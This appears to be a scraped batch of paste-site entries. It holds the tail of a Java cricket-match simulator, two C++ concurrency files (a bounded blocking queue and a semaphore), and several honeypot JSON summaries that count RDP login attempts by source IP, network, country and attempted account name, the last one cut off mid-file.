        var three = new Ball(3, false);
        var four = new Ball(4, false);
        var five = new Ball(5, false);
        var six = new Ball(6, false);

        putBall.accept(gone, new int[] {33, 10084, 128308, 128997});
        putBall.accept(dot, new int[] {48, 128420, 9899, 11035, 9899, 11035});
        putBall.accept(one, new int[] {49, 129293, 9898, 11036, 9898, 11036});
        putBall.accept(two, new int[] {50, 128154, 128994, 129001});
        putBall.accept(three, new int[] {51, 129505, 128992, 128999});
        putBall.accept(four, new int[] {52, 128153, 128309, 128998});
        putBall.accept(five, new int[] {53, 128156, 128995, 129002});
        putBall.accept(six, new int[] {54, 128155, 128993, 129000});

        Supplier<Ball> otherBall = () -> five;

        Function<Integer, Ball> carBall = x -> ballDict.getOrDefault(x, otherBall.get());

        var cars = scanner.nextLine();

        System.out.println(teams[0].coachUpper + "" VS "" + teams[1].coachUpper + "" TEST\n"");

        System.out.println(teams[0].nameUpper + ""\nvs\n"" + teams[1].nameUpper + ""\n"");

        var decision = toss == batting.value ? ""bat"" : ""bowl"";
        System.out.println(teams[toss].name + "" won the toss and chose to "" + decision + ""\n"");

        System.out.println(""1ST INNINGS\n"");

        for (var car : filteredStr(cars)) {
            count.value += 1;
            var ball = carBall.apply(car);
            batterRuns.value += ball.runs;
            // batterBalls.value += 1;
            totalRuns.value += ball.runs;
            teamRuns[batting.value] += ball.runs;
            wicket.value = ball.wicket;
            if (wicket.value) {
                printBatter.accept(true);
                batterRuns.value = 0;
                // batterBalls.value = 0;
                totalWickets.value += 1;
                if (totalWickets.value > 10) {
                    System.out.println(""\n"" + totalRuns + ""/"" + totalWickets + ""\n"");
                    batting.value = bowling.getAsInt();
                    totalRuns.value = 0;
                    totalWickets.value = 0;
                    innings.value += 1;
                    if (innings.value == 3) {
                        var lead = teamRuns[0] - teamRuns[1];
                        if (lead == 0) {
                            System.out.println(""SCORES LEVEL"");
                        } else {
                            var leading = lead > 0 ? 0 : 1;
                            System.out.println(teams[leading].nameUpper + "" LEAD BY "" + runPl.apply(Math.abs(lead)) + ""\n"");
                        }
                        System.out.println(""2ND INNINGS\n"");
                    } else if (innings.value == 4) {
                        var deficit = teamRuns[bowling.getAsInt()] - teamRuns[batting.value];
                        if (deficit < 0) {
                            System.out.println(teams[batting.value].nameUpper + "" WIN BY AN INNINGS AND "" + runPl.apply(-deficit));
                            return;
                        } else {
                            target.value = 1 + deficit;
                            System.out.println(teams[batting.value].nameUpper + "" NEED "" + runPl.apply(target.value) + "" TO WIN\n"");
                        }
                    } else if (innings.value > 4) {
                        var lead = teamRuns[batting.value] - teamRuns[bowling.getAsInt()];
                        if (lead == 0) {
                            System.out.println(""MATCH TIED\n"");
                        } else {
                            System.out.println(teams[batting.value].nameUpper + "" WIN BY "" + runPl.apply(lead) + ""\n"");
                        }
                        return;
                    }
                }
            } else if (innings.value == 4 && totalRuns.value >= target.value) {
                printCurrentInnings.run();
                System.out.println(teams[batting.value].nameUpper + "" WIN BY "" + wicketPl.apply(11 - totalWickets.value));
                return;
            }
        }

        printCurrentInnings.run();

        var lead = teamRuns[batting.value] - teamRuns[bowling.getAsInt()];
        if (innings.value == 4) {
            System.out.println(teams[batting.value].nameUpper + "" NEED "" + runPl.apply(1 - lead) + "" TO WIN"");
        } else {
            if (lead == 0) {
                System.out.println(""SCORES LEVEL"");
            } else {
                var leading = lead > 0 ? batting.value : bowling.getAsInt();
                System.out.println(teams[leading].nameUpper + "" LEAD BY "" + runPl.apply(Math.abs(lead)));
            }
        }
    }
}
"
KSAgmj54,Untitled,den4ik2003,C++,Thursday 29th of June 2023 07:38:55 PM CDT,"#pragma once

#include ""tagged_semaphore.hpp""

#include <deque>

// Bounded Blocking Multi-Producer/Multi-Consumer (MPMC) Queue

template <typename T>
class BoundedBlockingQueue {
 public:
  explicit BoundedBlockingQueue(size_t capacity)
      : capacity_(capacity),
        lower_semaphore_(0),
        upper_semaphore_(capacity),
        like_mutex_(1) {
  }

  void Put(T value) {
    auto token(std::move(upper_semaphore_.Acquire()));

    auto lock(std::move(like_mutex_.Acquire()));
    buffer_.push_back(std::move(value));
    like_mutex_.Release(std::move(lock));  // нужен ли тут мув?

    lower_semaphore_.Release(std::move(token));
  }

  T Take() {
    auto token(std::move(lower_semaphore_.Acquire()));

    auto lock(std::move(like_mutex_.Acquire()));
    T front(std::move(buffer_.front()));
    buffer_.pop_front();
    like_mutex_.Release(std::move(lock));

    upper_semaphore_.Release(std::move(token));
    return front;
  }

 private:
  // Tags
  struct TagLikeMutex {};

  struct TagLowerUpper {};

 private:
  size_t capacity_;
  std::deque<T> buffer_;
  TaggedSemaphore<TagLowerUpper> lower_semaphore_;
  TaggedSemaphore<TagLowerUpper> upper_semaphore_;
  TaggedSemaphore<TagLikeMutex> like_mutex_;
};
"
bFFYQS7v,Untitled,den4ik2003,C++,Thursday 29th of June 2023 07:38:22 PM CDT,"#pragma once

#include <twist/ed/stdlike/mutex.hpp>
#include <twist/ed/stdlike/condition_variable.hpp>

#include <cstdlib>

class Semaphore {
 public:
  explicit Semaphore(size_t tokens)
      : tokens_amount_(tokens) {
  }

  void Acquire() {
    std::unique_lock lock(mutex_);

    while (tokens_amount_ == 0) {
      have_tokens_inside_.wait(lock);
    }

    --tokens_amount_;
  }

  void Release() {
    std::lock_guard guard(mutex_);

    ++tokens_amount_;
    have_tokens_inside_.notify_one();
  }

 private:
  twist::ed::stdlike::condition_variable have_tokens_inside_;
  twist::ed::stdlike::mutex mutex_;
  size_t tokens_amount_;  // protected by mutex
};
"
nBnkwK5f,2023-06-29_stats.json,rdp_snitch,JSON,Thursday 29th of June 2023 07:18:00 PM CDT,"{
  ""ip"": {
    ""69.58.124.234"": 132,
    ""92.204.139.79"": 180,
    ""125.74.93.228"": 126,
    ""120.71.0.5"": 90,
    ""192.99.110.133"": 21,
    ""46.10.214.186"": 93,
    ""36.108.169.132"": 96,
    ""51.75.160.42"": 12,
    ""178.21.163.70"": 30,
    ""185.66.228.185"": 60,
    ""114.217.18.245"": 81,
    ""201.93.165.53"": 18,
    ""20.42.101.211"": 153,
    ""222.216.35.179"": 3,
    ""168.138.255.225"": 57,
    ""168.138.149.190"": 18,
    ""167.94.138.126"": 3,
    ""120.132.17.153"": 18,
    ""87.251.75.145"": 12,
    ""164.92.158.134"": 9,
    ""91.240.118.133"": 24,
    ""45.227.254.26"": 6,
    ""31.43.185.32"": 24,
    ""129.213.112.193"": 3,
    ""185.170.144.3"": 6,
    ""38.89.141.128"": 27,
    ""146.190.110.202"": 6,
    ""87.251.75.120"": 6,
    ""103.171.121.130"": 30,
    ""176.111.173.170"": 12,
    ""194.165.16.78"": 12,
    ""39.104.21.190"": 9,
    ""192.99.89.204"": 3,
    ""217.133.16.32"": 6,
    ""138.197.8.152"": 3,
    ""116.47.111.114"": 3,
    ""139.162.114.83"": 30,
    ""43.156.6.9"": 93,
    ""190.93.152.18"": 6,
    ""194.26.135.222"": 3,
    ""103.171.0.205"": 3,
    ""104.152.52.199"": 3,
    ""173.212.220.211"": 3,
    ""45.227.254.54"": 6,
    ""154.26.128.19"": 6,
    ""87.251.75.64"": 3,
    ""202.55.133.12"": 6,
    ""198.235.24.3"": 9,
    ""45.119.81.119"": 6,
    ""87.251.64.110"": 6,
    ""62.122.184.38"": 9,
    ""89.248.167.131"": 3,
    ""36.139.61.15"": 3,
    ""213.226.123.144"": 3,
    ""40.84.173.160"": 3,
    ""40.77.125.127"": 3,
    ""35.241.200.216"": 3,
    ""198.235.24.79"": 9,
    ""62.122.184.168"": 12,
    ""62.122.184.166"": 12,
    ""103.177.34.118"": 6,
    ""42.117.65.173"": 3
  },
  ""asn"": {
    ""AS32899"": 132,
    ""AS398108"": 180,
    ""AS141998"": 126,
    ""AS137695"": 186,
    ""AS16276"": 36,
    ""AS8866"": 93,
    ""AS21419"": 30,
    ""AS201689"": 60,
    ""AS4134"": 84,
    ""AS27699"": 18,
    ""AS8075"": 159,
    ""AS31898"": 78,
    ""AS398324"": 3,
    ""AS140292"": 18,
    ""AS208091"": 21,
    ""AS14061"": 18,
    ""AS57523"": 60,
    ""AS267784"": 12,
    ""AS211736"": 24,
    ""AS48080"": 12,
    ""AS174"": 27,
    ""AS142454"": 30,
    ""AS213010"": 12,
    ""AS48721"": 12,
    ""AS37963"": 9,
    ""AS8612"": 6,
    ""AS17858"": 3,
    ""AS63949"": 30,
    ""AS132203"": 93,
    ""AS19429"": 6,
    ""AS63737"": 9,
    ""AS14987"": 3,
    ""AS51167"": 3,
    ""AS141995"": 6,
    ""AS396982"": 21,
    ""AS131386"": 6,
    ""AS202425"": 3,
    ""AS56041"": 3,
    ""AS49943"": 3,
    ""AS135967"": 6,
    ""AS18403"": 3
  },
  ""isp"": {
    ""Bresco Broadband"": 132,
    ""GoDaddy.com, LLC"": 180,
    ""China Telecom"": 126,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 186,
    ""OVH SAS"": 33,
    ""Vivacom Bulgaria EAD"": 93,
    ""Pishtaze E Jadid Infomration Company"": 30,
    ""Lamerd Information & Communication Technology Co., ltd"": 60,
    ""Chinanet"": 84,
    ""Vivo"": 18,
    ""Microsoft Corporation"": 159,
    ""Oracle Corporation"": 78,
    ""Censys, Inc."": 3,
    ""Addresses CNNIC"": 18,
    ""XHOST-INTERNET-SOLUTIONS"": 21,
    ""DigitalOcean, LLC"": 18,
    ""Chang Way Technologies Co. Limited"": 60,
    ""Flyservers S.A."": 24,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Dmitriy Panchenko"": 12,
    ""Cogent Communications"": 33,
    ""IT SPECTRUM MEDIA PVT LTD"": 30,
    ""GigaHostingServices OU"": 12,
    ""Hangzhou Alibaba Advertising Co"": 9,
    ""OVH Hosting"": 3,
    ""Tiscali Italia SpA"": 6,
    ""LG POWERCOMM"": 3,
    ""Akamai Technologies, Inc."": 30,
    ""Shenzhen Tencent Computer Systems Company Limited"": 93,
    ""ETB - Colombia"": 6,
    ""Vietserver Services Technology Company Limited"": 9,
    ""Rethem Hosting LLC"": 3,
    ""Contabo GmbH"": 3,
    ""Google LLC"": 21,
    ""Long Van System Solution"": 6,
    ""IP Volume inc"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""IT Resheniya LLC"": 3,
    ""VERMOS"": 6,
    ""FPT Telecom Company"": 3
  },
  ""org"": {
    ""Bresco Broadband"": 132,
    ""Unknown"": 294,
    ""Chinanet GS"": 126,
    ""Chinanet XJ"": 90,
    ""AVAST Software"": 21,
    ""Bulgarian Telecommunications Company Plc"": 93,
    ""Chinanet ZJ"": 96,
    ""OVH Ltd"": 12,
    ""Chinanet JS"": 81,
    ""TELEF\ufffdNICA BRASIL S.A"": 18,
    ""Microsoft Azure Cloud (eastus)"": 153,
    ""Chinanet GX"": 3,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 75,
    ""Censys, Inc"": 3,
    ""Xhost Internet Solutions"": 27,
    ""DigitalOcean, LLC"": 15,
    ""Chang Way Technologies Co. Limited"": 60,
    ""UAB Host Baltic"": 12,
    ""FOP Dmytro Nedilskyi"": 24,
    ""Oracle Cloud Infrastructure (us-ashburn-1)"": 3,
    ""Xhostis"": 6,
    ""Hosting Source"": 27,
    ""IT Spectrum Media PVT LTD"": 30,
    ""GigaHostingServices OU"": 12,
    ""Flyservers S.A"": 12,
    ""Aliyun Computing Co., LTD"": 9,
    ""BrainStorm Network Inc"": 3,
    ""Tiscali SpA"": 6,
    ""Digital Ocean"": 3,
    ""Xpeed"": 3,
    ""Linode, LLC"": 30,
    ""Tencent Cloud Computing"": 93,
    ""ETB - Colombia"": 6,
    ""YUH Application Software Company Limited"": 3,
    ""Rethem Hosting LLC"": 3,
    ""Contabo GmbH"": 3,
    ""Contabo Asia Private LTD"": 6,
    ""VietServer Services technology company limited"": 6,
    ""Palo Alto Networks, Inc"": 18,
    ""IP Volume inc"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""IT Resheniya LLC"": 3,
    ""Microsoft Azure Cloud (southcentralus)"": 3,
    ""Microsoft Azure Cloud (centralus)"": 3,
    ""Google Cloud (europe-west1)"": 3,
    ""Vermos Company Limited"": 6,
    ""Vietnam Internet Network Information Center"": 3
  },
  ""regionName"": {
    ""Ohio"": 132,
    ""Virginia"": 336,
    ""Gansu"": 126,
    ""Xinjiang Uyghur Autonomous Region"": 90,
    ""Quebec"": 24,
    ""Sofia-Capital"": 93,
    ""Zhejiang"": 99,
    ""England"": 12,
    ""Tehran"": 90,
    ""Jiangsu"": 81,
    ""Sao Paulo"": 93,
    ""Guangxi"": 3,
    ""Michigan"": 3,
    ""Beijing"": 27,
    ""North Holland"": 39,
    ""Moscow"": 66,
    ""Vilnius"": 12,
    ""Kyiv City"": 24,
    ""New York"": 27,
    ""South West"": 6,
    ""Karnataka"": 30,
    ""Mazovia"": 12,
    ""Kaunas"": 12,
    ""Lombardy"": 6,
    ""New Jersey"": 3,
    ""Jeollabuk-do"": 3,
    ""Tokyo"": 30,
    ""North West"": 93,
    ""Bogota D.C."": 6,
    ""Hanoi"": 15,
    ""Illinois"": 3,
    ""Bavaria"": 3,
    ""North East"": 6,
    ""California"": 18,
    ""Ho Chi Minh"": 9,
    ""St.-Petersburg"": 3,
    ""Texas"": 3,
    ""Iowa"": 3,
    ""Brussels Capital"": 3
  },
  ""country"": {
    ""United States"": 528,
    ""China"": 426,
    ""Canada"": 24,
    ""Bulgaria"": 93,
    ""United Kingdom"": 12,
    ""Iran"": 90,
    ""Brazil"": 93,
    ""Netherlands"": 39,
    ""Russia"": 69,
    ""Lithuania"": 24,
    ""Ukraine"": 24,
    ""Singapore"": 105,
    ""India"": 30,
    ""Poland"": 12,
    ""Italy"": 6,
    ""South Korea"": 3,
    ""Japan"": 30,
    ""Colombia"": 6,
    ""Vietnam"": 24,
    ""Germany"": 3,
    ""Belgium"": 3
  },
  ""account"": {
    ""142.93.8.59"": 1152,
    ""hello"": 291,
    ""Test"": 42,
    ""(empty)"": 9,
    ""Administr"": 57,
    ""Domain"": 69,
    ""nmap"": 3,
    ""UZnaZRkKA"": 3,
    ""rCpLaM"": 3,
    ""ObPcLI"": 3,
    ""root"": 3,
    ""tyCpYZblJ"": 3,
    ""nlTtfI"": 3,
    ""adYRzf"": 3
  },
  ""keyboard"": {
    ""Unknown"": 1644
  },
  ""client_build"": {
    ""Unknown"": 1644
  },
  ""client_name"": {
    ""Unknown"": 1644
  },
  ""ip_type"": {
    ""Unknown"": 1098,
    ""hosting & proxy"": 30,
    ""hosting"": 426,
    ""mobile"": 57,
    ""proxy"": 33
  }
}"
YYEP7M6K,2023-06-29_stats.json,rdp_snitch,JSON,Thursday 29th of June 2023 07:16:07 PM CDT,"{
  ""ip"": {
    ""69.58.124.234"": 88,
    ""92.204.139.79"": 120,
    ""125.74.93.228"": 84,
    ""120.71.0.5"": 60,
    ""192.99.110.133"": 14,
    ""46.10.214.186"": 62,
    ""36.108.169.132"": 64,
    ""51.75.160.42"": 8,
    ""178.21.163.70"": 20,
    ""185.66.228.185"": 40,
    ""114.217.18.245"": 54,
    ""201.93.165.53"": 12,
    ""20.42.101.211"": 102,
    ""222.216.35.179"": 2,
    ""168.138.255.225"": 38,
    ""168.138.149.190"": 12,
    ""167.94.138.126"": 2,
    ""120.132.17.153"": 12,
    ""87.251.75.145"": 8,
    ""164.92.158.134"": 6,
    ""91.240.118.133"": 16,
    ""45.227.254.26"": 4,
    ""31.43.185.32"": 16,
    ""129.213.112.193"": 2,
    ""185.170.144.3"": 4,
    ""38.89.141.128"": 18,
    ""146.190.110.202"": 4,
    ""87.251.75.120"": 4,
    ""103.171.121.130"": 20,
    ""176.111.173.170"": 8,
    ""194.165.16.78"": 8,
    ""39.104.21.190"": 6,
    ""192.99.89.204"": 2,
    ""217.133.16.32"": 4,
    ""138.197.8.152"": 2,
    ""116.47.111.114"": 2,
    ""139.162.114.83"": 20,
    ""43.156.6.9"": 62,
    ""190.93.152.18"": 4,
    ""194.26.135.222"": 2,
    ""103.171.0.205"": 2,
    ""104.152.52.199"": 2,
    ""173.212.220.211"": 2,
    ""45.227.254.54"": 4,
    ""154.26.128.19"": 4,
    ""87.251.75.64"": 2,
    ""202.55.133.12"": 4,
    ""198.235.24.3"": 6,
    ""45.119.81.119"": 4,
    ""87.251.64.110"": 4,
    ""62.122.184.38"": 6,
    ""89.248.167.131"": 2,
    ""36.139.61.15"": 2,
    ""213.226.123.144"": 2,
    ""40.84.173.160"": 2,
    ""40.77.125.127"": 2,
    ""35.241.200.216"": 2,
    ""198.235.24.79"": 6,
    ""62.122.184.168"": 8,
    ""62.122.184.166"": 8,
    ""103.177.34.118"": 4,
    ""42.117.65.173"": 2
  },
  ""asn"": {
    ""AS32899"": 88,
    ""AS398108"": 120,
    ""AS141998"": 84,
    ""AS137695"": 124,
    ""AS16276"": 24,
    ""AS8866"": 62,
    ""AS21419"": 20,
    ""AS201689"": 40,
    ""AS4134"": 56,
    ""AS27699"": 12,
    ""AS8075"": 106,
    ""AS31898"": 52,
    ""AS398324"": 2,
    ""AS140292"": 12,
    ""AS208091"": 14,
    ""AS14061"": 12,
    ""AS57523"": 40,
    ""AS267784"": 8,
    ""AS211736"": 16,
    ""AS48080"": 8,
    ""AS174"": 18,
    ""AS142454"": 20,
    ""AS213010"": 8,
    ""AS48721"": 8,
    ""AS37963"": 6,
    ""AS8612"": 4,
    ""AS17858"": 2,
    ""AS63949"": 20,
    ""AS132203"": 62,
    ""AS19429"": 4,
    ""AS63737"": 6,
    ""AS14987"": 2,
    ""AS51167"": 2,
    ""AS141995"": 4,
    ""AS396982"": 14,
    ""AS131386"": 4,
    ""AS202425"": 2,
    ""AS56041"": 2,
    ""AS49943"": 2,
    ""AS135967"": 4,
    ""AS18403"": 2
  },
  ""isp"": {
    ""Bresco Broadband"": 88,
    ""GoDaddy.com, LLC"": 120,
    ""China Telecom"": 84,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 124,
    ""OVH SAS"": 22,
    ""Vivacom Bulgaria EAD"": 62,
    ""Pishtaze E Jadid Infomration Company"": 20,
    ""Lamerd Information & Communication Technology Co., ltd"": 40,
    ""Chinanet"": 56,
    ""Vivo"": 12,
    ""Microsoft Corporation"": 106,
    ""Oracle Corporation"": 52,
    ""Censys, Inc."": 2,
    ""Addresses CNNIC"": 12,
    ""XHOST-INTERNET-SOLUTIONS"": 14,
    ""DigitalOcean, LLC"": 12,
    ""Chang Way Technologies Co. Limited"": 40,
    ""Flyservers S.A."": 16,
    ""FOP Dmytro Nedilskyi"": 16,
    ""Dmitriy Panchenko"": 8,
    ""Cogent Communications"": 22,
    ""IT SPECTRUM MEDIA PVT LTD"": 20,
    ""GigaHostingServices OU"": 8,
    ""Hangzhou Alibaba Advertising Co"": 6,
    ""OVH Hosting"": 2,
    ""Tiscali Italia SpA"": 4,
    ""LG POWERCOMM"": 2,
    ""Akamai Technologies, Inc."": 20,
    ""Shenzhen Tencent Computer Systems Company Limited"": 62,
    ""ETB - Colombia"": 4,
    ""Vietserver Services Technology Company Limited"": 6,
    ""Rethem Hosting LLC"": 2,
    ""Contabo GmbH"": 2,
    ""Google LLC"": 14,
    ""Long Van System Solution"": 4,
    ""IP Volume inc"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""IT Resheniya LLC"": 2,
    ""VERMOS"": 4,
    ""FPT Telecom Company"": 2
  },
  ""org"": {
    ""Bresco Broadband"": 88,
    ""Unknown"": 196,
    ""Chinanet GS"": 84,
    ""Chinanet XJ"": 60,
    ""AVAST Software"": 14,
    ""Bulgarian Telecommunications Company Plc"": 62,
    ""Chinanet ZJ"": 64,
    ""OVH Ltd"": 8,
    ""Chinanet JS"": 54,
    ""TELEF\ufffdNICA BRASIL S.A"": 12,
    ""Microsoft Azure Cloud (eastus)"": 102,
    ""Chinanet GX"": 2,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 50,
    ""Censys, Inc"": 2,
    ""Xhost Internet Solutions"": 18,
    ""DigitalOcean, LLC"": 10,
    ""Chang Way Technologies Co. Limited"": 40,
    ""UAB Host Baltic"": 8,
    ""FOP Dmytro Nedilskyi"": 16,
    ""Oracle Cloud Infrastructure (us-ashburn-1)"": 2,
    ""Xhostis"": 4,
    ""Hosting Source"": 18,
    ""IT Spectrum Media PVT LTD"": 20,
    ""GigaHostingServices OU"": 8,
    ""Flyservers S.A"": 8,
    ""Aliyun Computing Co., LTD"": 6,
    ""BrainStorm Network Inc"": 2,
    ""Tiscali SpA"": 4,
    ""Digital Ocean"": 2,
    ""Xpeed"": 2,
    ""Linode, LLC"": 20,
    ""Tencent Cloud Computing"": 62,
    ""ETB - Colombia"": 4,
    ""YUH Application Software Company Limited"": 2,
    ""Rethem Hosting LLC"": 2,
    ""Contabo GmbH"": 2,
    ""Contabo Asia Private LTD"": 4,
    ""VietServer Services technology company limited"": 4,
    ""Palo Alto Networks, Inc"": 12,
    ""IP Volume inc"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""IT Resheniya LLC"": 2,
    ""Microsoft Azure Cloud (southcentralus)"": 2,
    ""Microsoft Azure Cloud (centralus)"": 2,
    ""Google Cloud (europe-west1)"": 2,
    ""Vermos Company Limited"": 4,
    ""Vietnam Internet Network Information Center"": 2
  },
  ""regionName"": {
    ""Ohio"": 88,
    ""Virginia"": 224,
    ""Gansu"": 84,
    ""Xinjiang Uyghur Autonomous Region"": 60,
    ""Quebec"": 16,
    ""Sofia-Capital"": 62,
    ""Zhejiang"": 66,
    ""England"": 8,
    ""Tehran"": 60,
    ""Jiangsu"": 54,
    ""Sao Paulo"": 62,
    ""Guangxi"": 2,
    ""Michigan"": 2,
    ""Beijing"": 18,
    ""North Holland"": 26,
    ""Moscow"": 44,
    ""Vilnius"": 8,
    ""Kyiv City"": 16,
    ""New York"": 18,
    ""South West"": 4,
    ""Karnataka"": 20,
    ""Mazovia"": 8,
    ""Kaunas"": 8,
    ""Lombardy"": 4,
    ""New Jersey"": 2,
    ""Jeollabuk-do"": 2,
    ""Tokyo"": 20,
    ""North West"": 62,
    ""Bogota D.C."": 4,
    ""Hanoi"": 10,
    ""Illinois"": 2,
    ""Bavaria"": 2,
    ""North East"": 4,
    ""California"": 12,
    ""Ho Chi Minh"": 6,
    ""St.-Petersburg"": 2,
    ""Texas"": 2,
    ""Iowa"": 2,
    ""Brussels Capital"": 2
  },
  ""country"": {
    ""United States"": 352,
    ""China"": 284,
    ""Canada"": 16,
    ""Bulgaria"": 62,
    ""United Kingdom"": 8,
    ""Iran"": 60,
    ""Brazil"": 62,
    ""Netherlands"": 26,
    ""Russia"": 46,
    ""Lithuania"": 16,
    ""Ukraine"": 16,
    ""Singapore"": 70,
    ""India"": 20,
    ""Poland"": 8,
    ""Italy"": 4,
    ""South Korea"": 2,
    ""Japan"": 20,
    ""Colombia"": 4,
    ""Vietnam"": 16,
    ""Germany"": 2,
    ""Belgium"": 2
  },
  ""account"": {
    ""142.93.8.59"": 768,
    ""hello"": 194,
    ""Test"": 28,
    ""(empty)"": 6,
    ""Administr"": 38,
    ""Domain"": 46,
    ""nmap"": 2,
    ""UZnaZRkKA"": 2,
    ""rCpLaM"": 2,
    ""ObPcLI"": 2,
    ""root"": 2,
    ""tyCpYZblJ"": 2,
    ""nlTtfI"": 2,
    ""adYRzf"": 2
  },
  ""keyboard"": {
    ""Unknown"": 1096
  },
  ""client_build"": {
    ""Unknown"": 1096
  },
  ""client_name"": {
    ""Unknown"": 1096
  },
  ""ip_type"": {
    ""Unknown"": 732,
    ""hosting & proxy"": 20,
    ""hosting"": 284,
    ""mobile"": 38,
    ""proxy"": 22
  }
}"
ASYapFjy,2023-06-29_stats.json,rdp_snitch,JSON,Thursday 29th of June 2023 07:15:08 PM CDT,"{
  ""ip"": {
    ""69.58.124.234"": 44,
    ""92.204.139.79"": 60,
    ""125.74.93.228"": 42,
    ""120.71.0.5"": 30,
    ""192.99.110.133"": 7,
    ""46.10.214.186"": 31,
    ""36.108.169.132"": 32,
    ""51.75.160.42"": 4,
    ""178.21.163.70"": 10,
    ""185.66.228.185"": 20,
    ""114.217.18.245"": 27,
    ""201.93.165.53"": 6,
    ""20.42.101.211"": 51,
    ""222.216.35.179"": 1,
    ""168.138.255.225"": 19,
    ""168.138.149.190"": 6,
    ""167.94.138.126"": 1,
    ""120.132.17.153"": 6,
    ""87.251.75.145"": 4,
    ""164.92.158.134"": 3,
    ""91.240.118.133"": 8,
    ""45.227.254.26"": 2,
    ""31.43.185.32"": 8,
    ""129.213.112.193"": 1,
    ""185.170.144.3"": 2,
    ""38.89.141.128"": 9,
    ""146.190.110.202"": 2,
    ""87.251.75.120"": 2,
    ""103.171.121.130"": 10,
    ""176.111.173.170"": 4,
    ""194.165.16.78"": 4,
    ""39.104.21.190"": 3,
    ""192.99.89.204"": 1,
    ""217.133.16.32"": 2,
    ""138.197.8.152"": 1,
    ""116.47.111.114"": 1,
    ""139.162.114.83"": 10,
    ""43.156.6.9"": 31,
    ""190.93.152.18"": 2,
    ""194.26.135.222"": 1,
    ""103.171.0.205"": 1,
    ""104.152.52.199"": 1,
    ""173.212.220.211"": 1,
    ""45.227.254.54"": 2,
    ""154.26.128.19"": 2,
    ""87.251.75.64"": 1,
    ""202.55.133.12"": 2,
    ""198.235.24.3"": 3,
    ""45.119.81.119"": 2,
    ""87.251.64.110"": 2,
    ""62.122.184.38"": 3,
    ""89.248.167.131"": 1,
    ""36.139.61.15"": 1,
    ""213.226.123.144"": 1,
    ""40.84.173.160"": 1,
    ""40.77.125.127"": 1,
    ""35.241.200.216"": 1,
    ""198.235.24.79"": 3,
    ""62.122.184.168"": 4,
    ""62.122.184.166"": 4,
    ""103.177.34.118"": 2,
    ""42.117.65.173"": 1
  },
  ""asn"": {
    ""AS32899"": 44,
    ""AS398108"": 60,
    ""AS141998"": 42,
    ""AS137695"": 62,
    ""AS16276"": 12,
    ""AS8866"": 31,
    ""AS21419"": 10,
    ""AS201689"": 20,
    ""AS4134"": 28,
    ""AS27699"": 6,
    ""AS8075"": 53,
    ""AS31898"": 26,
    ""AS398324"": 1,
    ""AS140292"": 6,
    ""AS208091"": 7,
    ""AS14061"": 6,
    ""AS57523"": 20,
    ""AS267784"": 4,
    ""AS211736"": 8,
    ""AS48080"": 4,
    ""AS174"": 9,
    ""AS142454"": 10,
    ""AS213010"": 4,
    ""AS48721"": 4,
    ""AS37963"": 3,
    ""AS8612"": 2,
    ""AS17858"": 1,
    ""AS63949"": 10,
    ""AS132203"": 31,
    ""AS19429"": 2,
    ""AS63737"": 3,
    ""AS14987"": 1,
    ""AS51167"": 1,
    ""AS141995"": 2,
    ""AS396982"": 7,
    ""AS131386"": 2,
    ""AS202425"": 1,
    ""AS56041"": 1,
    ""AS49943"": 1,
    ""AS135967"": 2,
    ""AS18403"": 1
  },
  ""isp"": {
    ""Bresco Broadband"": 44,
    ""GoDaddy.com, LLC"": 60,
    ""China Telecom"": 42,
    ""CHINATELECOM Xinjiang Wulumuqi MAN network"": 62,
    ""OVH SAS"": 11,
    ""Vivacom Bulgaria EAD"": 31,
    ""Pishtaze E Jadid Infomration Company"": 10,
    ""Lamerd Information & Communication Technology Co., ltd"": 20,
    ""Chinanet"": 28,
    ""Vivo"": 6,
    ""Microsoft Corporation"": 53,
    ""Oracle Corporation"": 26,
    ""Censys, Inc."": 1,
    ""Addresses CNNIC"": 6,
    ""XHOST-INTERNET-SOLUTIONS"": 7,
    ""DigitalOcean, LLC"": 6,
    ""Chang Way Technologies Co. Limited"": 20,
    ""Flyservers S.A."": 8,
    ""FOP Dmytro Nedilskyi"": 8,
    ""Dmitriy Panchenko"": 4,
    ""Cogent Communications"": 11,
    ""IT SPECTRUM MEDIA PVT LTD"": 10,
    ""GigaHostingServices OU"": 4,
    ""Hangzhou Alibaba Advertising Co"": 3,
    ""OVH Hosting"": 1,
    ""Tiscali Italia SpA"": 2,
    ""LG POWERCOMM"": 1,
    ""Akamai Technologies, Inc."": 10,
    ""Shenzhen Tencent Computer Systems Company Limited"": 31,
    ""ETB - Colombia"": 2,
    ""Vietserver Services Technology Company Limited"": 3,
    ""Rethem Hosting LLC"": 1,
    ""Contabo GmbH"": 1,
    ""Google LLC"": 7,
    ""Long Van System Solution"": 2,
    ""IP Volume inc"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""IT Resheniya LLC"": 1,
    ""VERMOS"": 2,
    ""FPT Telecom Company"": 1
  },
  ""org"": {
    ""Bresco Broadband"": 44,
    ""Unknown"": 98,
    ""Chinanet GS"": 42,
    ""Chinanet XJ"": 30,
    ""AVAST Software"": 7,
    ""Bulgarian Telecommunications Company Plc"": 31,
    ""Chinanet ZJ"": 32,
    ""OVH Ltd"": 4,
    ""Chinanet JS"": 27,
    ""TELEF\ufffdNICA BRASIL S.A"": 6,
    ""Microsoft Azure Cloud (eastus)"": 51,
    ""Chinanet GX"": 1,
    ""Oracle Cloud Infrastructure (sa-saopaulo-1)"": 25,
    ""Censys, Inc"": 1,
    ""Xhost Internet Solutions"": 9,
    ""DigitalOcean, LLC"": 5,
    ""Chang Way Technologies Co. Limited"": 20,
    ""UAB Host Baltic"": 4,
    ""FOP Dmytro Nedilskyi"": 8,
    ""Oracle Cloud Infrastructure (us-ashburn-1)"": 1,
    ""Xhostis"": 2,
    ""Hosting Source"": 9,
    ""IT Spectrum Media PVT LTD"": 10,
    ""GigaHostingServices OU"": 4,
    ""Flyservers S.A"": 4,
    ""Aliyun Computing Co., LTD"": 3,
    ""BrainStorm Network Inc"": 1,
    ""Tiscali SpA"": 2,
    ""Digital Ocean"": 1,
    ""Xpeed"": 1,
    ""Linode, LLC"": 10,
    ""Tencent Cloud Computing"": 31,
    ""ETB - Colombia"": 2,
